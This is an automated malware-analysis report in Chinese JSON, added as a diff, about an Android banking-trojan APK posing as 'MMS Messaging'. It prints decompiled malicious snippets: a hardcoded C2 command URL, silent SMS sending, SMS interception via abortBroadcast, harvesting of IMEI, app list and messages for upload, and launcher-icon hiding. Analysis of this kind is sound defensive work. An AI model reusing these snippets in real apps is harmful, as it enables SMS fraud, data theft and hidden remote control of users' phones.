@@ -1,0 +1,194 @@
+{
+  "APK信息": {
+    "文件名": "9efa16125de476183f9fc8fc06f84896dee8f0bcc920e31288f3add6e91c4ea7.apk",
+    "sha256": "9efa16125de476183f9fc8fc06f84896dee8f0bcc920e31288f3add6e91c4ea7",
+    "包名": "exts.denmark",
+    "应用名": "MMS Messaging",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 176.8
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\Constants;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final String ADMIN_LINK = \"http://5.61.39.3/?action=command\";",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class Constants {\n>>>     public static final String ADMIN_LINK = \"http://5.61.39.3/?action=command\";\n      public static final String APP_ID = \"APP_ID\";\n      public static final String CARD_SENT = \"CARD_SENT\";\n      public static final String INSTALL_ID = \"1\";",
+          "behavior_description": "代码硬编码了一个基于裸IP的C2服务器地址（5.61.39.3），URL参数action=command明确表明该端点用于接收远程控制命令。结合同类中定义的INTERCEPTING_ENABLED（短信拦截）、LOCK_ENABLED（设备锁定）等常量，表明该应用通过此C2地址与攻击者通信，接收并执行远程指令，实现远程控制功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\utils\\Utils;",
+          "method_signature": "for(int i = 0; i < parts.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "sms.sendMultipartTextMessage(number, null, parts, sents, null);\nsms.sendTextMessage(number, null, text, PendingIntent.getBroadcast(context, 0, sentIntent2, 134217728), null);",
+          "malicious_code_snippet_context": "                      sentIntent.putExtra(\"text\", parts.get(i));\n                      sents.add(PendingIntent.getBroadcast(context, 0, sentIntent, 134217728));\n                  }\n>>>                 sms.sendMultipartTextMessage(number, null, parts, sents, null);\n>>>                 return;\n              }\n              Intent sentIntent2 = new Intent(Starter.ACTION_REPORT);\n              sentIntent2.putExtra(\"number\", number);",
+          "behavior_description": "代码通过SmsManager在无用户交互的情况下静默发送短信。number和text参数作为数据来源，直接传入sendTextMessage/sendMultipartTextMessage作为sink。恶意样本中此行为通常用于向付费号码发送短信欺诈或通过短信进行C2通信，直接造成用户经济损失。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lexts\\denmark\\MessageReceiver;",
+          "method_signature": "if(needToInterceptIncoming)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\nIntent start = new Intent(context, (Class<?>) SendService.class);\nstart.setAction(SendService.REPORT_INCOMING_MESSAGE);\nstart.putExtra(\"number\", sender);\nstart.putExtra(\"text\", text);\ncontext.startService(start);\nif (needToInterceptIncoming) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "          Map<String, String> messages = retrieveMessages(intent);\n          for (String sender : messages.keySet()) {\n              String text = messages.get(sender);\n>>>             boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\n>>>             Intent start = new Intent(context, (Class<?>) SendService.class);\n>>>             start.setAction(SendService.REPORT_INCOMING_MESSAGE);\n>>>             start.putExtra(\"number\", sender);\n>>>             start.putExtra(\"text\", text);\n>>>             context.startService(start);\n>>>             if (needToInterceptIncoming) {\n>>>                 abortBroadcast();\n>>>             }\n          }\n      }\n  ",
+          "behavior_description": "代码从短信广播Intent中解析出PDU获取短信发送者和内容，将短信数据通过Intent传递给SendService进行上报处理，随后根据配置调用abortBroadcast()终止短信广播，导致系统短信应用无法收到该短信，实现短信拦截与窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\utils\\RequestFactory;",
+          "method_signature": "makeReg(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "JSONObject json = new JSONObject();\njson.put(\"imei\", Utils.getDeviceId(context));\njson.put(\"apps\", Utils.getAppList(context));\njson.put(\"sms\", Utils.readMessagesFromDeviceDB(context));\nreturn json;",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class RequestFactory {\n      public static JSONObject makeReg(Context context) throws Exception {\n>>>         JSONObject json = new JSONObject();\n>>>         json.put(\"type\", \"install\");\n>>>         json.put(\"country\", Utils.getCountry(context));\n>>>         json.put(\"imei\", Utils.getDeviceId(context));\n>>>         json.put(\"model\", Utils.getModel());\n          json.put(\"apps\", Utils.getAppList(context));\n          json.put(\"operator\", Utils.getOperator(context));\n          json.put(\"sms\", Utils.readMessagesFromDeviceDB(context));",
+          "behavior_description": "该方法收集设备的 IMEI、已安装应用列表、短信等敏感隐私数据，并将其组装成 JSON 对象用于后续的网络上传，属于典型的隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\activities\\MobileBank;",
+          "method_signature": "dispatchTakePictureIntent()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "Intent takePictureIntent = new Intent(\"android.media.action.IMAGE_CAPTURE\");\nif (takePictureIntent.resolveActivity(getPackageManager()) != null) {\n    File photoFile = createImageFile();\n    takePictureIntent.putExtra(\"output\", Uri.fromFile(photoFile));\n    startActivityForResult(takePictureIntent, REQUEST_TAKE_PHOTO);\n}",
+          "malicious_code_snippet_context": "  \n      /* JADX INFO: Access modifiers changed from: private */\n      public void dispatchTakePictureIntent() {\n>>>         Intent takePictureIntent = new Intent(\"android.media.action.IMAGE_CAPTURE\");\n>>>         if (takePictureIntent.resolveActivity(getPackageManager()) != null) {\n>>>             try {\n>>>                 File photoFile = createImageFile();\n>>>                 takePictureIntent.putExtra(\"output\", Uri.fromFile(photoFile));\n>>>                 startActivityForResult(takePictureIntent, REQUEST_TAKE_PHOTO);\n              } catch (IOException ex) {\n                  ex.printStackTrace();\n              }",
+          "behavior_description": "代码通过标准Intent（android.media.action.IMAGE_CAPTURE）调用系统相机应用进行拍照，拍摄的照片保存到外部存储公共目录的临时文件中。该代码位于MobileBank银行木马类中，疑似伪装银行应用诱导用户拍摄面部照片或身份证件，收集的图像可能被窃取用于身份盗用或社会工程学攻击。虽然使用标准Intent会显示相机UI，但在恶意样本上下文中，此功能被用于收集用户敏感生物特征信息。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\denmark\\Main;",
+          "method_signature": "hide()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private void hide() {\n    PackageManager packageManager = getPackageManager();\n    ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n    packageManager.setComponentEnabledSetting(componentName, 2, 1);\n}",
+          "malicious_code_snippet_context": "          finish();\n      }\n  \n>>>     private void hide() {\n>>>         PackageManager packageManager = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n>>>         packageManager.setComponentEnabledSetting(componentName, 2, 1);\n>>>     }\n  }",
+          "behavior_description": "调用 PackageManager.setComponentEnabledSetting() 将 Main Activity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED(值=2)，使应用图标从启动器中消失，实现图标隐藏。恶意软件常在用户首次启动后调用此方法隐藏自身，以避免被用户发现后续的恶意行为（如后台服务、隐私窃取等）。数据流向：getPackageManager() → setComponentEnabledSetting(componentName, DISABLED, DONT_KILL_APP)",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
